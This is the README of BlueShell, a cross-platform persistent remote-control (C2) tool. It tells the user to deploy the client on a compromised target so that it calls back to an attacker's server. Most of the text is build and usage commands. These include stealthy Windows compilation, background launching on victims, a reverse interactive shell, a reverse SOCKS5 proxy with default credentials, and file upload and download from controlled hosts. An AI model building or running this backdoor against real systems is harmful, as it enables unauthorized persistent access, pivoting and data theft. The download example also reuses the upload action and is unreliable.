BlueShell
===
BlueShell是一个跨平台的持续远控工具，拿下靶机后部署BlueShell Client端，Client端会每隔固定时间向C&C Server发起反弹连接尝试，Server启动并连接Client端后，即可实现对靶机的持续控制，目前支持的主要功能有：
+ 跨平台，支持Linux、Windows、MacOS
+ 交互式Shell反弹（Windows只支持普通反弹Shell）
+ Socks5反弹代理
+ 文件上传、下载
+ TLS通信加密

编译
---

### Linux and MacOS
生成bsClient
```shell script
go get github.com/armon/go-socks5
go get github.com/creack/pty
go get github.com/hashicorp/yamux

go build --ldflags "-s -w " -o bsClient client.go
```
生成bsServer
```shell script
go get github.com/creack/pty
go get github.com/hashicorp/yamux
go get github.com/djimenez/iconv-go
go get golang.org/x/crypto/ssh/terminal

go build --ldflags "-s -w " -o bsServer server.go
```
### Windows
生成client
```shell script
go get github.com/armon/go-socks5
go get github.com/creack/pty
go get github.com/hashicorp/yamux

go build --ldflags "-s -w -H=windowsgui" -o bsClient.exe client.go
```

用法
---
### Client
在受控靶机上运行bsClient    
#### Windows靶机：    
默认配置模式启动
```shell script
start /b bsClient.exe
```
参数模式启动,-h指定远控端地址，-p远控端监听端口,-t尝试连接远控的间隔秒数
```shell script
start /b bsClient.exe -h 10.0.0.1 -p 443 -t 10
```
#### Linux and MacOS靶机:    
默认配置模式启动
```shell script
nohup bsClient &
```
参数模式启动,-h指定远控端地址，-p指定远控端监听端口
```shell script
nohup bsClient -h 10.0.0.1 -p 443 &
```
### C&C Server
远控端运行bsServer,需要是Linux机器
#### Action:反弹shell
默认启动，远控监听8081端口，执行反弹shell操作
```shell script
./bsServer
```
参数启动，-p指定远控监听443端口，-a指定执行反弹shell操作
```shell script
./bsServer -p 443 -a shell
```
windows靶机的乱码问题解决,-rencode指定靶机的编码类型
```shell script
./bsServer -rencode gb2312
```
#### Action:反弹Socks5代理
默认启动，远控监听8081端口，执行反弹socks操作，socks5的默认监听端口为7777，默认用户名blue，默认密码Blue@2020
```shell script
./bsServer -a socks
```
参数启动，-p指定远控监听443端口，-a指定执行反弹socks操作,-sport指定socks监听的端口为7778，-suser指定socks代理的认证账号，-spass指定socks代理的认证密码
```shell script
./bsServer -p 443 -a socks -sport 7778 -suser socksUser -spass socksPassword
```
#### Action:文件上传下载
上传本地文件到受控靶机，-lpath指定需要上传的本地文件路径，-rdir指定上传到的目录
```shell script
./bsServer -a upload -lpath /tmp/tmp.txt -rdir c:\\
```
从受控靶机下载文件到本地，-rpath指定需要下载的文件地址，-ldir指定存放下载文件的本地路径
```shell script
./bsServer -a upload -rpath c:\\tmp.txt -ldir /tmp
```

参考
---
+ https://github.com/sysdream/hershell
+ https://github.com/creaktive/tsh